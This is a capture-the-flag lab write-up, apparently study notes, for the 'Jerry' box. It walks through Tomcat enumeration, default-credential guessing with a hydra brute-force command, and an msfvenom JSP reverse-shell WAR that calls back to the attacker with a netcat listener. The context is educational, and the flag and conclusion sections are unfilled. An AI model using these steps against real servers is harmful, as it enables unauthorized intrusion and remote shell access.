---
title: Jerry
description: Apache Tomcat with default credentials on the manager panel. Upload a malicious WAR file, get a shell as SYSTEM.
---

# Jerry

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows Server 2012 R2 |
| **Focus** | Apache Tomcat default credentials + WAR file upload |

Jerry is one of the most straightforward boxes on the platform — and one of the most instructive.
Apache Tomcat is everywhere in enterprise environments, often running with weak or default credentials on the manager interface.
That interface can deploy WAR files. WAR files can be web shells or reverse shells.
The chain is three steps: find the panel, authenticate, deploy code.

Running as SYSTEM from the start means no privilege escalation needed — the write-up is short, but the lesson is not.

---

## Setup

Kali VM via QEMU. VPN config transferred from host via HTTP server, connected with openvpn.
If large packets time out, lower the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

```bash
ping <IP>
nmap -sC -sV -Pn <IP>
```

**Open ports to look for:**

| Port | Service | Detail |
|------|---------|--------|
| 8080 | http | Apache Tomcat |

Only one real port. Tomcat version in the response header or error pages — note it down.

---

## Web Application — Tomcat Manager

Navigate to `http://<IP>:8080`.
The default Tomcat landing page confirms the service and version.

The manager interface lives at:

```
http://<IP>:8080/manager/html
```

This is the admin panel that allows WAR file deployment. It is protected by HTTP basic authentication.

---

## Credential Discovery

Try default Tomcat credentials. Common pairs to attempt:

| Username | Password |
|----------|----------|
| admin | admin |
| admin | password |
| admin | (blank) |
| tomcat | tomcat |
| tomcat | s3cret |
| manager | manager |

Hydra or Metasploit's `auxiliary/scanner/http/tomcat_mgr_login` can brute-force this if manual attempts fail.

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
      -f http-get://<IP>:8080/manager/html
```

Note which credentials worked and log them.

---

## Exploitation — WAR File Upload

### Generate the payload

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=<your-tun0-IP> LPORT=<port> \
  -f war -o shell.war
```

### Deploy it

In the Tomcat Manager UI, scroll to the **Deploy** section, upload `shell.war`, and click Deploy.
The application will appear in the application list.

### Catch the shell

```bash
nc -lvnp <port>
```

Then trigger the WAR by navigating to:

```
http://<IP>:8080/shell/
```

The shell connects back. Confirm the user context — Tomcat typically runs as SYSTEM on Windows.

---

## Flags

Both flags are in the same location on this box:

```cmd
type C:\Users\Administrator\Desktop\flags\*
```

**User flag:** `<!-- insert here -->`

**Root flag:** `<!-- insert here -->`

---

!!! example "Conclusion"
    Write this after completing the box.
    Cover: why Tomcat manager should never be internet-facing, how default credentials are a systemic risk not a one-off mistake,
    and what a WAR deployment looks like in access logs — useful context for the defensive side of CJCA.
